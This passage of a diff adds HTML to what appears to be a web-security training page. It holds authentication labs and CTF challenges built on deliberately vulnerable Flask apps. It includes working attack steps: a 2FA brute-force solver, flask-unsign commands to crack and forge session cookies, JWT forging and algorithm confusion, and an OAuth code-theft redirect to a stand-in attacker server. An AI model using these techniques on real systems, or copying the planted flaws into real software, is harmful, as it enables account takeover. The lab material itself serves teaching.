+            <ol>
+              <li>Set a known session cookie: <code>document.cookie = "session_id=ATTACKER_KNOWN_SID"</code></li>
+              <li>Send the victim a link with the pre-set cookie (e.g., via XSS or social engineering)</li>
+              <li>When the victim logs in, the server associates the admin session with your known SID</li>
+              <li>Access <code>/dashboard</code> with the pre-set <code>session_id</code> cookie</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: 2FA Bypass</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Bypass two-factor authentication by directly accessing the post-2FA endpoint.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — 2FA bypass
+from flask import Flask, request, session, redirect, jsonify
+import secrets
+
+app = Flask(__name__)
+app.secret_key = secrets.token_hex(16)
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        user = request.form.get('username', '')
+        pwd = request.form.get('password', '')
+        if user == 'admin' and pwd == 'admin':
+            session['user'] = 'admin'
+            session['2fa_passed'] = False
+            return redirect('/2fa')
+        return '&lt;h1&gt;Invalid&lt;/h1&gt;'
+    return '''&lt;form method="POST"&gt;&lt;input name="username"&gt;
+    &lt;input name="password" type="password"&gt;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;'''
+
+@app.route('/2fa', methods=['GET', 'POST'])
+def twofa():
+    if session.get('user') != 'admin':
+        return redirect('/login')
+    if request.method == 'POST':
+        code = request.form.get('code', '')
+        if code == '123456':  # Hardcoded for lab
+            session['2fa_passed'] = True
+            return redirect('/dashboard')
+        return '&lt;h1&gt;Invalid code&lt;/h1&gt;'
+    return '''&lt;h1&gt;Enter 2FA Code&lt;/h1&gt;
+    &lt;form method="POST"&gt;&lt;input name="code"&gt;&lt;button&gt;Verify&lt;/button&gt;&lt;/form&gt;'''
+
+@app.route('/dashboard')
+def dashboard():
+    # Vulnerable: only checks user session, not 2fa_passed!
+    if session.get('user') == 'admin':
+        return '&lt;h1&gt;Dashboard — FLAG{2fa_byp4ss3d}&lt;/h1&gt;'
+    return redirect('/login')
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Login with admin:admin — you're redirected to /2fa</li>
+              <li>Instead of entering the 2FA code, navigate directly to <code>/dashboard</code></li>
+              <li>The dashboard only checks <code>session['user']</code>, not <code>session['2fa_passed']</code></li>
+              <li>Flag is displayed without completing 2FA</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: Race Condition Authentication</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit a TOCTOU race condition in the login flow to authenticate without valid credentials.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — Race condition auth
+from flask import Flask, request, session, jsonify
+import secrets, time
+
+app = Flask(__name__)
+app.secret_key = secrets.token_hex(16)
+
+# Simulated "verify then login" with a time gap
+pending_logins = {}
+
+@app.route('/verify', methods=['POST'])
+def verify():
+    user = request.form.get('username', '')
+    pwd = request.form.get('password', '')
+    token = secrets.token_hex(8)
+    if user == 'admin' and pwd == 'correct_password':
+        pending_logins[token] = {'user': user, 'valid': True}
+    else:
+        pending_logins[token] = {'user': user, 'valid': False}
+    return jsonify({"verify_token": token})
+
+@app.route('/complete-login', methods=['POST'])
+def complete_login():
+    token = request.form.get('verify_token', '')
+    time.sleep(0.1)  # Simulated processing delay (TOCTOU window)
+    login = pending_logins.get(token, {})
+    if login.get('valid'):
+        return jsonify({"flag": "FLAG{r4c3_c0nd_4uth}"})
+    return jsonify({"error": "Invalid credentials"}), 401
+
+app.run(debug=True, threaded=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Understand the two-step flow: <code>/verify</code> then <code>/complete-login</code></li>
+              <li>Send a valid verify request and an invalid one simultaneously</li>
+              <li>During the processing delay, swap the verify_token or manipulate the pending_logins state</li>
+              <li>Use Turbo Intruder or threading to exploit the race window</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: Password Reset Token Analysis</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Analyze weak password reset tokens to predict the admin's reset token.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — Weak reset tokens
+from flask import Flask, request
+import hashlib, time
+
+app = Flask(__name__)
+reset_tokens = {}
+
+@app.route('/forgot', methods=['GET', 'POST'])
+def forgot():
+    if request.method == 'POST':
+        user = request.form.get('username', '')
+        # Vulnerable: token is MD5(username + timestamp) — predictable!
+        ts = str(int(time.time()))
+        token = hashlib.md5((user + ts).encode()).hexdigest()
+        reset_tokens[token] = user
+        return f'&lt;p&gt;Reset link: /reset?token={token} (sent via email)&lt;/p&gt;&lt;p&gt;Timestamp: {ts}&lt;/p&gt;'
+    return '''&lt;form method="POST"&gt;&lt;input name="username" placeholder="Username"&gt;
+    &lt;button&gt;Reset Password&lt;/button&gt;&lt;/form&gt;'''
+
+@app.route('/reset')
+def reset():
+    token = request.args.get('token', '')
+    user = reset_tokens.get(token)
+    if user:
+        return f'&lt;h1&gt;Reset for {user} — FLAG{{r3s3t_t0k3n_pr3d1ct}}&lt;/h1&gt;'
+    return '&lt;h1&gt;Invalid token&lt;/h1&gt;'
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Request a reset for your own account — note the token and timestamp</li>
+              <li>Identify the pattern: <code>MD5(username + timestamp)</code></li>
+              <li>Request a reset for admin and calculate the expected token</li>
+              <li>Use the timestamp from the response or brute force nearby timestamps</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: Cookie Manipulation</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Modify client-side cookies to escalate privileges from user to admin.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — Cookie manipulation
+from flask import Flask, request, make_response
+import base64
+
+app = Flask(__name__)
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        user = request.form.get('username', 'guest')
+        # Vulnerable: role stored in client-side cookie (base64 encoded)
+        cookie_val = base64.b64encode(f'{{"user":"{user}","role":"user"}}'.encode()).decode()
+        resp = make_response(f'&lt;h1&gt;Welcome {user}!&lt;/h1&gt;&lt;a href="/admin"&gt;Admin Panel&lt;/a&gt;')
+        resp.set_cookie('auth', cookie_val)
+        return resp
+    return '''&lt;form method="POST"&gt;&lt;input name="username"&gt;&lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;'''
+
+@app.route('/admin')
+def admin():
+    cookie = request.cookies.get('auth', '')
+    try:
+        import json
+        data = json.loads(base64.b64decode(cookie))
+        if data.get('role') == 'admin':
+            return '&lt;h1&gt;Admin Panel — FLAG{c00k13_m4n1p}&lt;/h1&gt;'
+        return f'&lt;h1&gt;Access denied. Role: {data.get("role")}&lt;/h1&gt;'
+    except:
+        return '&lt;h1&gt;Invalid cookie&lt;/h1&gt;'
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Login and inspect the <code>auth</code> cookie in your browser</li>
+              <li>Base64 decode it — see the JSON with <code>"role":"user"</code></li>
+              <li>Modify to <code>"role":"admin"</code>, re-encode, and set the cookie</li>
+              <li>Visit <code>/admin</code> to get the flag</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+
+      <!-- CTF TAB -->
+      <div class="tab-content" id="ctf">
+        <h2>CTF Challenges</h2>
+
+        <div class="ctf-card">
+          <h4>Challenge 1: JWT Forgery</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Decode the JWT, change the role claim to admin, and re-sign it. The flag is in the admin endpoint response.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py — JWT forgery CTF
+from flask import Flask, request, jsonify
+import jwt
+
+app = Flask(__name__)
+SECRET = 'secret'  # Intentionally trivial
+
+@app.route('/')
+def index():
+    token = jwt.encode({"user": "player", "role": "user"}, SECRET, algorithm="HS256")
+    return f'&lt;h1&gt;JWT Challenge&lt;/h1&gt;&lt;p&gt;Your token: &lt;code&gt;{token}&lt;/code&gt;&lt;/p&gt;&lt;p&gt;Access /flag with a valid admin token.&lt;/p&gt;'
+
+@app.route('/flag')
+def flag():
+    token = request.headers.get('Authorization', '').replace('Bearer ', '')
+    try:
+        payload = jwt.decode(token, SECRET, algorithms=["HS256"])
+        if payload.get('role') == 'admin':
+            return jsonify({"flag": "FLAG{jwt_forgery_101}"})
+        return jsonify({"error": "Not admin"}), 403
+    except Exception as e:
+        return jsonify({"error": str(e)}), 401
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. Visit <code>/</code> to get a token. Decode it at jwt.io.<br>
+            2. The secret is intentionally trivial — try common words: <code>secret</code>, <code>password</code>, <code>key</code>.<br>
+            3. Once you know the secret, re-sign with <code>{"user":"player","role":"admin"}</code>.<br>
+            4. Send: <code>curl -H "Authorization: Bearer NEW_TOKEN" http://localhost:5000/flag</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: IDOR to Access Admin</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Exploit an IDOR vulnerability to access another user's profile and find the admin's secret flag.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py — IDOR CTF
+from flask import Flask, request, jsonify
+import jwt
+
+app = Flask(__name__)
+SECRET = 'idor_challenge_key'
+
+USERS = {
+    1: {"username": "admin", "email": "admin@target.com", "secret": "FLAG{idor_access_control_fail}", "role": "admin"},
+    2: {"username": "player", "email": "player@target.com", "secret": "nothing here", "role": "user"},
+    3: {"username": "guest", "email": "guest@target.com", "secret": "still nothing", "role": "user"},
+}
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username', '')
+    for uid, user in USERS.items():
+        if user['username'] == username:
+            token = jwt.encode({"uid": uid, "role": user['role']}, SECRET, algorithm="HS256")
+            return jsonify({"token": token, "uid": uid})
+    return jsonify({"error": "User not found"}), 404
+
+@app.route('/api/users/&lt;int:uid&gt;')
+def get_user(uid):
+    token = request.headers.get('Authorization', '').replace('Bearer ', '')
+    try:
+        jwt.decode(token, SECRET, algorithms=["HS256"])
+        # Vulnerable: checks that token is valid but NOT that uid matches the token's uid
+        if uid in USERS:
+            return jsonify(USERS[uid])
+        return jsonify({"error": "User not found"}), 404
+    except:
+        return jsonify({"error": "Invalid token"}), 401
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. Login as <code>player</code>: <code>curl -X POST http://localhost:5000/login -d "username=player"</code><br>
+            2. Note your <code>uid</code> (2) and token.<br>
+            3. Access your own profile: <code>GET /api/users/2</code> with your token.<br>
+            4. Now try <code>GET /api/users/1</code> with the same token — the server doesn't check if the UID matches your token.<br>
+            5. The admin's profile (uid=1) contains the flag.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: Full Auth Chain Exploit</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Chain multiple auth vulnerabilities: crack a weak JWT secret, escalate privileges, bypass 2FA, and access the admin flag.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py — Auth chain CTF
+from flask import Flask, request, jsonify, session
+import jwt, secrets
+
+app = Flask(__name__)
+app.secret_key = secrets.token_hex(16)
+JWT_SECRET = 'letmein'  # Weak — crackable
+
+OTP_CODES = {}
+
+@app.route('/login', methods=['POST'])
+def login():
+    user = request.form.get('username', 'guest')
+    token = jwt.encode({"user": user, "role": "user", "2fa": False}, JWT_SECRET, algorithm="HS256")
+    return jsonify({"token": token, "message": "Login OK. Complete 2FA to proceed."})
+
+@app.route('/2fa', methods=['POST'])
+def verify_2fa():
+    token = request.headers.get('Authorization', '').replace('Bearer ', '')
+    code = request.form.get('code', '')
+    try:
+        payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
+        # Vulnerable: OTP is a 4-digit code with no rate limiting
+        expected = OTP_CODES.get(payload['user'], '1337')
+        if code == expected:
+            new_token = jwt.encode({**payload, "2fa": True}, JWT_SECRET, algorithm="HS256")
+            return jsonify({"token": new_token})
+        return jsonify({"error": "Invalid OTP"}), 401
+    except Exception as e:
+        return jsonify({"error": str(e)}), 401
+
+@app.route('/admin/flag')
+def admin_flag():
+    token = request.headers.get('Authorization', '').replace('Bearer ', '')
+    try:
+        payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
+        if payload.get('role') != 'admin':
+            return jsonify({"error": "Admin role required"}), 403
+        if not payload.get('2fa'):
+            return jsonify({"error": "2FA required"}), 403
+        return jsonify({"flag": "FLAG{full_auth_chain_pwned}"})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 401
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Step 1 — Crack JWT:</strong> Get a token from <code>/login</code>, crack the HS256 secret with hashcat (<code>-m 16500</code>). Secret is in common wordlists.<br>
+            <strong>Step 2 — Escalate role:</strong> Once you have the secret, forge a token with <code>"role": "admin"</code>.<br>
+            <strong>Step 3 — Bypass 2FA:</strong> Two options:<br>
+            &nbsp;&nbsp;a) Brute force the 4-digit OTP (no rate limiting) at <code>/2fa</code><br>
+            &nbsp;&nbsp;b) Since you know the JWT secret, just forge a token with <code>"2fa": true</code> already set<br>
+            <strong>Step 4:</strong> Access <code>/admin/flag</code> with the forged token containing <code>role=admin</code> and <code>2fa=true</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: JWT Algorithm Confusion</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">The server uses RS256 but accepts HS256. Obtain the public key and use it as the HMAC secret to forge an admin token.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request, jsonify
+import jwt
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.backends import default_backend
+
+app = Flask(__name__)
+
+# Generate RSA key pair
+private_key = rsa.generate_private_key(65537, 2048, default_backend())
+public_key = private_key.public_key()
+PUB_PEM = public_key.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
+PRIV_PEM = private_key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption())
+
+@app.route('/public-key')
+def pub():
+    return PUB_PEM.decode()
+
+@app.route('/login', methods=['POST'])
+def login():
+    token = jwt.encode({"user": "guest", "role": "user"}, PRIV_PEM, algorithm="RS256")
+    return jsonify({"token": token})
+
+@app.route('/admin')
+def admin():
+    token = request.headers.get('Authorization', '').replace('Bearer ', '')
+    try:
+        # Vulnerable: accepts both RS256 and HS256
+        payload = jwt.decode(token, PUB_PEM, algorithms=["RS256", "HS256"])
+        if payload.get('role') == 'admin':
+            return jsonify({"flag": "FLAG{4lg0_c0nfus10n_rs2hs}"})
+        return jsonify({"error": "Not admin"}), 403
+    except Exception as e:
+        return jsonify({"error": str(e)}), 401
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. Fetch the public key from <code>/public-key</code>.<br>
+            2. The server accepts HS256 — sign a token using the public key PEM as the HMAC secret.<br>
+            3. <code>jwt.encode({"user":"admin","role":"admin"}, open('pub.pem').read(), algorithm="HS256")</code><br>
+            4. The server verifies HS256 with the same public key bytes — signature matches.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: IDOR Escalation Chain</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Chain IDOR across multiple API endpoints to discover the admin's secret, then use it to unlock the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request, jsonify
+import jwt
+
+app = Flask(__name__)
+SECRET = 'idor_chain_key'
+
+USERS = {
+    1: {"name": "admin", "email": "admin@corp.com", "secret_code": "UNLOCK_42"},
+    2: {"name": "player", "email": "player@test.com", "secret_code": "nope"},
+}
+
+@app.route('/login', methods=['POST'])
+def login():
+    token = jwt.encode({"uid": 2}, SECRET)
+    return jsonify({"token": token})
+
+@app.route('/api/user/&lt;int:uid&gt;')
+def user(uid):
+    token = request.headers.get('Authorization', '').replace('Bearer ', '')
+    try:
+        jwt.decode(token, SECRET, algorithms=["HS256"])
+        return jsonify(USERS.get(uid, {}))
+    except:
+        return jsonify({"error": "Invalid token"}), 401
+
+@app.route('/api/unlock', methods=['POST'])
+def unlock():
+    code = request.form.get('code', '')
+    if code == 'UNLOCK_42':
+        return jsonify({"flag": "FLAG{1d0r_3sc4l4t10n_ch41n}"})
+    return jsonify({"error": "Wrong code"}), 403
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. Login to get a token (uid=2).<br>
+            2. Access <code>/api/user/1</code> with your token — IDOR exposes admin's <code>secret_code</code>.<br>
+            3. Use the admin's secret_code at <code>/api/unlock</code> to get the flag.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: OAuth Token Theft via Open Redirect</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Steal an OAuth authorization code by chaining an open redirect with the OAuth flow.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request, redirect, jsonify
+import secrets
+
+app = Flask(__name__)
+AUTH_CODES = {}
+
+@app.route('/oauth/authorize')
+def authorize():
+    redirect_uri = request.args.get('redirect_uri', '')
+    if not redirect_uri.startswith('http://localhost:5000/'):
+        return '&lt;p&gt;Invalid redirect_uri&lt;/p&gt;', 400
+    code = secrets.token_hex(16)
+    AUTH_CODES[code] = True
+    return redirect(f'{redirect_uri}?code={code}')
+
+@app.route('/callback')
+def callback():
+    return f'&lt;p&gt;Auth code: {request.args.get("code")}&lt;/p&gt;'
+
+@app.route('/redirect')
+def open_redir():
+    return redirect(request.args.get('url', '/'))
+
+@app.route('/token', methods=['POST'])
+def token():
+    code = request.form.get('code', '')
+    if AUTH_CODES.pop(code, False):
+        return jsonify({"flag": "FLAG{oauth_0pen_r3d1r3ct}"})
+    return jsonify({"error": "Invalid code"}), 400
+
+app.run(debug=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The redirect_uri must start with <code>http://localhost:5000/</code>.<br>
+            There's an open redirect at <code>/redirect?url=...</code>.<br>
+            Set redirect_uri to <code>http://localhost:5000/redirect?url=http://YOUR_SERVER/steal</code>.<br>
+            The auth code will be forwarded to your server. Exchange it at <code>/token</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: Session Puzzle</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Decode and manipulate a Flask session cookie (client-side signed) to escalate to admin.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, session, jsonify
+
+app = Flask(__name__)
+app.secret_key = 'flask'  # Intentionally weak
+
+@app.route('/')
+def index():
+    session['user'] = 'guest'
+    session['role'] = 'user'
+    return '&lt;h1&gt;Session set. Check /admin&lt;/h1&gt;'
+
+@app.route('/admin')
+def admin():
+    if session.get('role') == 'admin':
+        return jsonify({"flag": "FLAG{fl4sk_s3ss10n_f0rg3}"})
+    return jsonify({"error": f"Role: {session.get('role', 'none')}"}), 403
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-bash"># Decode Flask session cookie
+# pip install flask-unsign
+flask-unsign --decode --cookie "SESSION_COOKIE_VALUE"
+
+# Brute force the secret
+flask-unsign --unsign --cookie "SESSION_COOKIE_VALUE" --wordlist rockyou.txt
+
+# Forge with known secret
+flask-unsign --sign --cookie '{"user":"admin","role":"admin"}' --secret 'flask'</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Flask session cookies are signed but not encrypted — you can read the contents.<br>
+            Use <code>flask-unsign</code> to crack the weak secret key.<br>
+            Forge a new cookie with <code>role: admin</code> and the cracked secret.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: 2FA Brute Force</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">The 2FA code is a 4-digit PIN with no rate limiting. Brute force it to access the admin panel.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request, session, jsonify
+import secrets
+
+app = Flask(__name__)
+app.secret_key = secrets.token_hex(16)
+OTP = '7291'  # Static for CTF
+
+@app.route('/login', methods=['POST'])
+def login():
+    if request.form.get('username') == 'admin' and request.form.get('password') == 'admin':
+        session['user'] = 'admin'
+        session['2fa'] = False
+        return jsonify({"message": "Enter 2FA code at /2fa"})
+    return jsonify({"error": "Invalid"}), 401
+
+@app.route('/2fa', methods=['POST'])
+def twofa():
+    if session.get('user') != 'admin':
+        return jsonify({"error": "Login first"}), 401
+    code = request.form.get('code', '')
+    if code == OTP:
+        session['2fa'] = True
+        return jsonify({"flag": "FLAG{2fa_brut3_f0rc3d}"})
+    return jsonify({"error": "Wrong code"}), 401
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-python"># solve.py
+import requests
+
+s = requests.Session()
+s.post('http://localhost:5000/login', data={'username': 'admin', 'password': 'admin'})
+
+for code in range(10000):
+    r = s.post('http://localhost:5000/2fa', data={'code': str(code).zfill(4)})
+    if 'FLAG' in r.text:
+        print(f'[+] Code: {code:04d}')
+        print(r.json())
+        break</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Login as admin first, then brute force all 10,000 possible 4-digit codes at <code>/2fa</code>.<br>
+            No rate limiting means you can try all codes in seconds.<br>
+            Use the solver script or Burp Intruder with a number list 0000-9999.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: Race Condition Login</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Exploit a race condition in the login flow where a temporary admin session is created and immediately revoked.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py
+from flask import Flask, request, jsonify
+import time, secrets, threading
+
+app = Flask(__name__)
+sessions = {}
+
+@app.route('/login', methods=['POST'])
+def login():
+    user = request.form.get('username', 'guest')
+    sid = secrets.token_hex(8)
+    sessions[sid] = {'user': user, 'role': 'admin'}  # Briefly admin
+    time.sleep(0.05)  # Processing delay
+    sessions[sid]['role'] = 'user'  # Downgrade
+    return jsonify({"session_id": sid})
+
+@app.route('/flag')
+def flag():
+    sid = request.args.get('sid', '')
+    s = sessions.get(sid, {})
+    if s.get('role') == 'admin':
+        return jsonify({"flag": "FLAG{r4c3_l0g1n_w1n}"})
+    return jsonify({"error": f"Role: {s.get('role', 'none')}"}), 403
+
+app.run(debug=True, threaded=True)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The session is briefly set to admin before being downgraded.<br>
+            Send the login request and immediately hit <code>/flag?sid=SESSION_ID</code> before the 50ms delay completes.<br>
+            Use two threads: one to login, another to access /flag with the returned SID within the race window.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: Default Credentials Scanner</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Multiple services run with default credentials. Find them all and collect the flags.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># server.py — Multiple services with defaults
+from flask import Flask, request, jsonify
+import threading
+
+app1 = Flask('app1')
+app2 = Flask('app2')
+app3 = Flask('app3')
+
+@app1.route('/login', methods=['POST'])
+def login1():
+    if request.form.get('username') == 'admin' and request.form.get('password') == 'admin':
+        return jsonify({"flag": "FLAG{d3f4ult_cr3ds_1}"})
+    return jsonify({"error": "Invalid"}), 401
+
+@app2.route('/login', methods=['POST'])
+def login2():
+    if request.form.get('username') == 'root' and request.form.get('password') == 'toor':
+        return jsonify({"flag": "FLAG{d3f4ult_cr3ds_2}"})
+    return jsonify({"error": "Invalid"}), 401
+
+@app3.route('/login', methods=['POST'])
+def login3():
+    if request.form.get('username') == 'admin' and request.form.get('password') == 'password':
+        return jsonify({"flag": "FLAG{d3f4ult_cr3ds_3}"})
+    return jsonify({"error": "Invalid"}), 401
+
+if __name__ == '__main__':
+    threading.Thread(target=lambda: app1.run(port=5001), daemon=True).start()
+    threading.Thread(target=lambda: app2.run(port=5002), daemon=True).start()
+    threading.Thread(target=lambda: app3.run(port=5003), daemon=True).start()
+    import time; time.sleep(999999)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Try common default credentials on each service:<br>
+            <code>admin:admin</code>, <code>admin:password</code>, <code>root:root</code>, <code>root:toor</code>, <code>admin:123456</code><br>
+            Use Hydra or a simple script to test all combinations across all ports.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
